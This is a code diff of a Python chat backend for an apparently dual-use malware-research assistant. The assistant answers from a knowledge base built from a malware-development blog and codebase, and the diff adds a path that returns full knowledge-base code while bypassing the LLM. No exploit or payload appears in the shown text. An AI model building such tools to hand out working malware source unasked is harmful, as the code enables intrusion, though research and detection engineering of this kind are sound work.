+- Binary analysis (PE anatomy, entropy, ROP chains, shellcode emulation)
+- Detection engineering (SIGMA rules, Sysmon EIDs, ETW providers)
+
+For every technical question I:
+1. Give a brief explanation
+2. Show a real code snippet from the knowledge base
+3. Map to MITRE ATT&CK technique(s)
+4. Add a detection / telemetry note
+
+Type any technical question or say **help** for more detail."""
+    ),
+
+    # 6. Which repos for knowledge base? -------------------------------------------
+    (
+        r"(which|what) repo|knowledge base (repo|source|setup)|kb (setup|index|source)|index.*knowledge|how.*index",
+        """## Knowledge Base - Setup & Sources
+
+The knowledge base is built from **@cocomelonc's** malware research blog posts and the local codebase.
+
+### Index it
+
+```bash
+# from the peekaboo root
+python3 peekaboo.py kb index
+```
+
+Or in the dashboard: **Settings -> Knowledge Base -> Reindex**.
+
+### What gets indexed
+
+| Source | Content |
+|---|---|
+| `cocomelonc.github.io` blog | ~150 posts: technique write-ups, code walk-throughs |
+| `~/hacking/meow` codebase | C/C++/Nim/Assembly source per technique |
+| Per-post metadata | MITRE ATT&CK IDs, category tags, blog URL |
+| Embeddings | `nomic-embed-text` 768-dim vectors (stored in `data/post_embeddings.json`) |
+
+### Output files
+
+```
+dashboard/knowledge_base.json   <- full text + snippets (used by Claude/Gemini)
+data/post_embeddings.json       <- vectors (used by Ollama RAG)
+data/library_cache.json         <- code snippets per slug
+```
+
+### Repos referenced
+
+- **`~/hacking/meow`** - main malware dev codebase (primary KB source)
+- **Blog:** https://cocomelonc.github.io - scraped for post content
+
+> **Ollama RAG** requires `nomic-embed-text` to be pulled first:
+> `ollama pull nomic-embed-text`"""
     ),
 ]
 
 
 def _canned_response(question: str) -> str:
-    import re
     q = question.lower().strip()
     for pattern, answer in _CANNED:
         if re.search(pattern, q):
@@ -1208,10 +1052,9 @@ def _canned_response(question: str) -> str:
 
 
 def _stream_canned(answer: str) -> Generator[str, None, None]:
-    """Yield a canned answer word-by-word to simulate streaming."""
     import time
-    words = answer.split(" ")
-    chunk = []
+    words  = answer.split(" ")
+    chunk: list[str] = []
     for i, word in enumerate(words):
         chunk.append(word)
         if len(chunk) >= 6 or i == len(words) - 1:
@@ -1220,19 +1063,34 @@ def _stream_canned(answer: str) -> Generator[str, None, None]:
             time.sleep(0.015)
 
 
-# -- public interface -----------------------------------------------------------
+# -- public interface -------------------------------------------------------------
 
 def stream_chat(messages: list[dict], provider: str = "claude") -> Generator[str, None, None]:
     """
     Stream a chat response.
     provider: "claude" | "gemini" | "ollama"
     messages: [{role, content}, ...]
+
+    Canned responses fire only for onboarding / help / product questions.
+    Technical questions always go through RAG -> LLM.
     """
-    last_user = next((m["content"] for m in reversed(messages) if m.get("role") == "user"), "")
-    canned = _canned_response(last_user)
-    if canned:
-        yield {"status": "canned", "msg": "instant answer"}
-        yield from _stream_canned(canned)
+    last_user = next(
+        (m["content"] for m in reversed(messages) if m.get("role") == "user"), ""
+    )
+
+    if not _is_technical_question(last_user):
+        canned = _canned_response(last_user)
+        if canned:
+            yield {"status": "canned", "msg": "instant answer"}
+            yield from _stream_canned(canned)
+            return
+
+    # Full-code requests bypass the LLM entirely - demo-fast, never truncated.
+    # Works for every provider; the LLM is only used for explanations now.
+    if _is_full_code_request(last_user):
+        yield {"status": "kb_direct", "msg": "loading code from KB…"}
+        response = _direct_kb_response(last_user)
+        yield from _stream_kb_chunks(response)
         return
 
     if provider == "gemini":
@@ -1265,21 +1123,11 @@ def kb_info() -> dict:
 
 
 def providers_status() -> dict:
-    """Check which providers are configured."""
-    claude_key = _get_anthropic_key()
-    gemini_key, gemini_model = _get_gemini_config()
-    ollama_ok, ollama_model  = _ollama_available()
+    claude_key  = _get_anthropic_key()
+    gemini_cfg  = _get_gemini_config()
+    ollama_ok, ollama_model = _ollama_available()
     return {
-        "claude": {
-            "available": bool(claude_key),
-            "model":     CLAUDE_MODEL,
-        },
-        "gemini": {
-            "available": bool(gemini_key),
-            "model":     gemini_model,
-        },
-        "ollama": {
-            "available": ollama_ok,
-            "model":     ollama_model,
-        },
+        "claude": {"available": bool(claude_key),               "model": CLAUDE_MODEL},
+        "gemini": {"available": bool(gemini_cfg["api_key"]),    "model": gemini_cfg["model"]},
+        "ollama": {"available": ollama_ok,                       "model": ollama_model},
     }
